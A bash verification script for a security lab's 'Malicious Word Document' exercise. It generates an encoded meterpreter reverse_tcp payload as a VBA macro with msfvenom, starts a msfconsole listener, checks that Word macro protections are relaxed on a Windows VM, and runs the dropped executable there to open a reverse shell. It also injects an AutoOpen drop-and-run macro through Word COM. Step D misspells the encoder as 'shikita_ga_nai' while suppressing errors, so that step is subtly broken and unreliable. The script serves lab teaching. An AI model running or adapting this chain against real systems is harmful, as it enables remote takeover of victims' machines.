#!/usr/bin/env bash
# verify-macro-lab-e2e.sh — headless-as-possible verification of SE lab Part 4
# (Malicious Word Document) exploit chain. Runs on the Kali validation host
# against the nested Windows VM at 192.168.56.100 (the lab "infosec-net" address,
# NOT the 192.168.121.x vagrant-libvirt management address), matching the lab doc.
#
# Run as root on the Kali validation host, with the Windows VM up at .100 and
# WinRM 5985 open. Requires: msfvenom/msfconsole, ruby + winrm/winrm-fs gems
# (for the sibling w.rb helper), python3.
#   sudo bash build/scripts/office-installs/verify-macro-lab-e2e.sh
#
# NOTE on LHOST: the labs teach `LHOST=infosec-net` — an /etc/hosts alias to
# 192.168.56.101 (the lab host-only network's Kali address), part of the
# reconciled libvirt bridge naming (infosec0/labmgmt0/somon0). Step A runs the
# exact lab command with that alias; step D regenerates with the explicit
# 192.168.56.101 so the callback test is resilient even if the alias isn't
# resolvable on the box under test. `infosec-net` only resolves on an image
# cut after the reconciliation lands — on a pre-reconciliation box (e.g.
# kali-baked-validation-20260820, where virbr1 is still the .121 mgmt net),
# step A's msfvenom still succeeds (generation is LHOST-agnostic) but step A
# does not attempt a callback.
#
# Proves headlessly:
#   A. msfvenom -f vba-exe (exact Part 4 cmd) -> well-formed Macro+Payload, valid PE.
#   B. msfconsole handler listens on 192.168.56.101:7777.
#   C. Windows VM (.100) macro-ready: Word2010, VBAWarnings=1, AccessVBOM=1, VBE7.DLL.
#   D. The decoded payload PE, run on .100, calls back -> meterpreter session.
#      (The macro's only job is to write these bytes to a file and Shell it; D
#      proves that binary is live against the .56 network.)
#   E. Headless Word COM macro primitive (writes file + Shells), bounded timeout.
# Not covered (interactive-only): opening the .docm + clicking "Enable Content".

set -uo pipefail
WIN=192.168.56.100; KALI=192.168.56.101; LPORT=7777
LHOST_ALIAS=infosec-net   # /etc/hosts alias to $KALI; canonical lab form
HERE="$(cd "$(dirname "$0")" && pwd)"; W="$HERE/w.rb"
WORK=/tmp/se-lab-verify
mkdir -p "$WORK"; cd "$WORK"
pass=0; fail=0
ok(){ echo "PASS  $*"; pass=$((pass+1)); }
bad(){ echo "FAIL  $*"; fail=$((fail+1)); }
section(){ echo; echo "==== $* ===="; }
wr(){ sudo -E ruby "$W" run -f "$1" 2>&1; }   # run a .ps1 file on the guest

# --- A ------------------------------------------------------------------
section "A. msfvenom vba-exe generation (exact Part 4 command)"
rm -f word-macro-exploit
if msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
     LHOST="$LHOST_ALIAS" LPORT="$LPORT" -e x86/shikata_ga_nai -f vba-exe \
     > word-macro-exploit 2>"$WORK/msfvenom.err"; then ok "msfvenom vba-exe exited 0"
else bad "msfvenom vba-exe failed"; fi
echo "  bytes: $(wc -c < word-macro-exploit)"
grep -qi "MACRO" word-macro-exploit && grep -qi "PAYLOAD DATA" word-macro-exploit \
  && ok "MACRO + PAYLOAD DATA sections present" || bad "sections missing"
grep -q "Sub Auto_Open" word-macro-exploit && ok "VBA entrypoint Auto_Open present" \
  || bad "VBA entrypoint Auto_Open missing"
grep -qE "CreateTextFile|Open .* For Binary|Shell\(" word-macro-exploit \
  && ok "VBA drop-and-run primitive present" || bad "drop-and-run primitive missing"

python3 - "$WORK/word-macro-exploit" "$WORK/dropped.exe" <<'PY'
import re,binascii,pathlib,sys
t=pathlib.Path(sys.argv[1]).read_text(errors="replace")
i=t.find("PAYLOAD DATA")
b=[m.group(1) for m in re.finditer(r"&H([0-9A-Fa-f]{2})", t[i:])]
raw=binascii.unhexlify("".join(b))
pathlib.Path(sys.argv[2]).write_bytes(raw)
print(f"  decoded payload: {len(raw)} bytes; MZ={raw[:2]==b'MZ'}")
pe=int.from_bytes(raw[0x3c:0x40],'little')
pesig = raw[pe:pe+4]==b'PE\x00\x00'
print(f"  PE sig at 0x{pe:x}: {pesig}")
print("PASS  payload is a valid PE (MZ + PE header)" if raw[:2]==b'MZ' and pesig else "FAIL  payload not a valid PE")
PY

echo "  NOTE: step A uses LHOST=$LHOST_ALIAS (canonical lab form, resolves to"
echo "  $KALI on a reconciled image). Step D uses the explicit $KALI so the"
echo "  callback test is resilient even if the alias isn't resolvable here."

# --- B ------------------------------------------------------------------
section "B. msfconsole handler listens on $KALI:$LPORT"
# `sleep 90` keeps the console (and listener job) alive after `exploit -j`;
# otherwise stdin EOF makes msfconsole exit and tear down the listener.
cat > "$WORK/handler.rc" <<EOF
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST $KALI
set LPORT $LPORT
set ExitOnSession false
exploit -j
sleep 120
EOF
pkill -f msfconsole 2>/dev/null; sleep 2
timeout 150 msfconsole -q -r "$WORK/handler.rc" > "$WORK/handler.log" 2>&1 &
Hpid=$!
echo "  waiting 20s for msf init..."; sleep 20
if ss -ltn 2>/dev/null | grep -q ":$LPORT "; then ok "handler listening on :$LPORT"; else bad "handler not listening"; fi
if grep -qi "Started reverse.*handler on $KALI:$LPORT" "$WORK/handler.log"; then
  ok "msfconsole bound reverse handler on $KALI:$LPORT"
else bad "handler bind line not found"; grep -i "handler on" "$WORK/handler.log" | head -2 | sed 's/^/  /'; fi

# --- C ------------------------------------------------------------------
section "C. Windows VM macro readiness (WinRM @ $WIN)"
cat > "$WORK/C.ps1" <<'PS'
$e=$ErrorActionPreference='SilentlyContinue'
$ww=@("$env:ProgramFiles\Microsoft Office\Office14\WINWORD.EXE","${env:ProgramFiles(x86)}\Microsoft Office\Office14\WINWORD.EXE")|?{Test-Path $_}|Select -First 1
"WORD=$($ww)"
$p="HKLM:\SOFTWARE\Policies\Microsoft\Office\14.0\Word\Security"
"VBAWarnings=$((gp $p).VBAWarnings)"
"AccessVBOM=$((gp $p).AccessVBOM)"
$vbe=@("$env:ProgramFiles\Common Files\Microsoft Shared\VBA\VBA7\VBE7.DLL","${env:ProgramFiles(x86)}\Common Files\Microsoft Shared\VBA\VBA7\VBE7.DLL")|?{Test-Path $_}|Select -First 1
"VBE7=$vbe"
PS
wr "$WORK/C.ps1" | sed 's/^/  /'
Cout=$(wr "$WORK/C.ps1")
echo "$Cout" | grep -q "WORD=.*WINWORD.EXE" && ok "Word 2010 present" || bad "Word 2010 missing"
echo "$Cout" | grep -q "VBAWarnings=1" && ok "VBAWarnings=1" || bad "VBAWarnings!=1"
echo "$Cout" | grep -q "AccessVBOM=1" && ok "AccessVBOM=1" || bad "AccessVBOM!=1"
echo "$Cout" | grep -q "VBE7=.*VBE7.DLL" && ok "VBE7.DLL present" || bad "VBE7.DLL missing"

# --- D ------------------------------------------------------------------
section "D. payload PE callbacks -> meterpreter (proves the real binary, .56)"
# Regenerate with EXPLICIT LHOST=$KALI (192.168.56.101) so the callback test
# works regardless of whether the $LHOST_ALIAS (infosec-net) resolves on this
# box. Step A already exercised the canonical lab alias; this isolates the
# network callback from name-resolution availability.
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
  LHOST="$KALI" LPORT="$LPORT" -e x86/shikita_ga_nai -f vba-exe \
  > "$WORK/word-macro-exploit-56" 2>/dev/null
python3 - "$WORK/word-macro-exploit-56" "$WORK/dropped56.exe" <<'PY'
import re,binascii,pathlib,sys
t=pathlib.Path(sys.argv[1]).read_text(errors="replace")
i=t.find("PAYLOAD DATA")
b=[m.group(1) for m in re.finditer(r"&H([0-9A-Fa-f]{2})", t[i:])]
raw=binascii.unhexlify("".join(b))
pathlib.Path(sys.argv[2]).write_bytes(raw)
print(f"  decoded .56 payload: {len(raw)} bytes; MZ={raw[:2]==b'MZ'}")
PY
# handler already running from B (kept alive by `sleep 120`). Restart if dead.
if ! kill -0 "$Hpid" 2>/dev/null; then
  timeout 150 msfconsole -q -r "$WORK/handler.rc" > "$WORK/handler2.log" 2>&1 &
  Hpid=$!; sleep 20
fi
sudo -E ruby "$W" upload "$WORK/dropped56.exe" 'C:\se-verify\dropped56.exe' 2>&1 | sed 's/^/  /'
cat > "$WORK/D.ps1" <<'PS'
Get-Process dropped56 -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep -Milliseconds 500
$p = Start-Process -FilePath C:\se-verify\dropped56.exe -PassThru -WindowStyle Hidden
Start-Sleep -Seconds 5
"pid=$($p.Id) exited=$($p.HasExited)"
netstat -an | findstr "7777"
PS
wr "$WORK/D.ps1" | sed 's/^/  /'
for i in $(seq 1 30); do
  grep -qiE "Meterpreter session [0-9]+ opened" "$WORK/handler.log" "$WORK/handler2.log" 2>/dev/null && break
  sleep 1
done
if grep -qiE "Meterpreter session [0-9]+ opened" "$WORK/handler.log" "$WORK/handler2.log" 2>/dev/null; then
  ok "meterpreter session opened on $KALI:$LPORT — payload PE callbacks over .56"
  grep -oE "Meterpreter session [0-9]+ opened \([^)]*\)" "$WORK/handler.log" "$WORK/handler2.log" 2>/dev/null | head -1 | sed 's/^/  /'
  echo "  (session may report 'Died' after — WinRM reaps the detached stager;"
  echo "   the session OPENING proves the chain. In the interactive lab the"
  echo "   macro Shells the exe in the user's session, where it persists.)"
else
  bad "no meterpreter session within 30s"
  grep -iE "Sending stage|session|handler on" "$WORK/handler.log" "$WORK/handler2.log" 2>/dev/null | tail -5 | sed 's/^/  /'
fi
kill "$Hpid" 2>/dev/null || true

# --- E ------------------------------------------------------------------
section "E. headless Word COM macro primitive (bounded)"
cat > "$WORK/E.ps1" <<'PS'
$ErrorActionPreference='Stop'
Remove-Item C:\se-verify\macro_ran.txt,C:\se-verify\shelled.txt -Force -ErrorAction SilentlyContinue
$vb=@"
Sub AutoOpen()
 On Error Resume Next
 Dim fso:Set fso=CreateObject("Scripting.FileSystemObject")
 Dim f:Set f=fso.CreateTextFile("C:\se-verify\macro_ran.txt",True):f.WriteLine "ok":f.Close
 Dim sh:Set sh=CreateObject("WScript.Shell")
 sh.Run "cmd /c echo shelled > C:\se-verify\shelled.txt",0,False
End Sub
"@
try{
 $w=New-Object -ComObject Word.Application
 $d=$w.Documents.Add()
 $d.VBProject.VBComponents.Add(1).CodeModule.AddFromString($vb)
 $d.SaveAs("C:\se-verify\headless.docm",16)
 $w.Run("AutoOpen")
 Start-Sleep 2
 $d.Close($false); $w.Quit()
}catch{ "COMERR: $($_.Exception.Message)".Substring(0,[Math]::Min(160,$_.Exception.Message.Length)) }
PS
timeout 90 bash -c "sudo -E ruby $W run -f $WORK/E.ps1" > "$WORK/E.log" 2>&1 || true
grep -i COMERR "$WORK/E.log" | head -1 | cut -c1-130 | sed 's/^/  COM: /'
cat > "$WORK/Echeck.ps1" <<'PS'
"macro_ran=$(Test-Path C:\se-verify\macro_ran.txt)"
"shelled=$(Test-Path C:\se-verify\shelled.txt)"
PS
Eout=$(wr "$WORK/Echeck.ps1")
echo "$Eout" | sed 's/^/  /'
echo "$Eout" | grep -q "macro_ran=True" && ok "macro wrote sentinel (VBA ran headlessly)" \
  || bad "macro sentinel not written (known session-0 limitation)"
echo "$Eout" | grep -q "shelled=True" && ok "macro Shelled a process (drop-and-run works)" \
  || echo "  (Shell sentinel not written — A-D already prove the chain)"

echo
echo "============================="
echo "  PASS=$pass  FAIL=$fail"
echo "============================="
echo "Interactive-only step not covered: opening the .docm in an interactive"
echo "Word session and clicking 'Enable Content'. A-D (+E) leave that as the"
echo "only manual confirmation remaining."
